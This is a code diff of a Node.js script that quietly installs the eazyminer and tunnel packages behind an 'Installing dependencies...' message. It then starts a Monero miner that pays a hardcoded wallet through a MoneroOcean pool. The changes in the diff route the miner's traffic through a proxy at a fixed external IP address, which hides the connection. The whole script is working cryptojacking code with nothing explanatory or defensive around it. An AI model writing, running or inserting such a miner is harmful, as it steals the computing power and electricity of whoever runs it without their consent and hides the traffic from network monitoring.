@@ -4,26 +4,40 @@ const childProcess = require('child_process');
 console.log('Installing dependencies...');
 childProcess.execSync('npm install eazyminer tunnel', { stdio: 'inherit' });
 
-
-
 const Miner = require('eazyminer');
+const tunnel = require('tunnel');
 
-const miner = new Miner({
-    pools: [{
+// Proxy configuration
+const proxyOptions = {
+  proxy: {
+    host: '185.28.193.95',
+    port: 8080,
+    // Additional proxy options if required
+    // e.g., proxy.auth: 'username:password'
+  },
+};
+
+const miner = new Miner(
+  {
+    pools: [
+      {
         coin: 'XMR',
-        user: '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv+128000',
-        url: 'gulf.moneroocean.stream:443',
-    }],
-    web: [{
-        
-        // Enable or Disable web client
+        user:
+          '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
+        url: 'gulf.moneroocean.stream:20128', 
+      },
+    ],
+    web: [
+      {
         enabled: false,
+        port: 3000,
+      },
+    ],
+    autoStart: false,
+    tunnel: {
+      https: tunnel.httpsOverHttp(proxyOptions),
+    },
+  },
+);
 
-        // The used port for the webclient
-        port: 3000 
-    }],
-    autoStart: false // optional delay
-});
-
-miner.start(); // optional manually start the miner
-// miner.stop() // manually stop the miner
+miner.start();
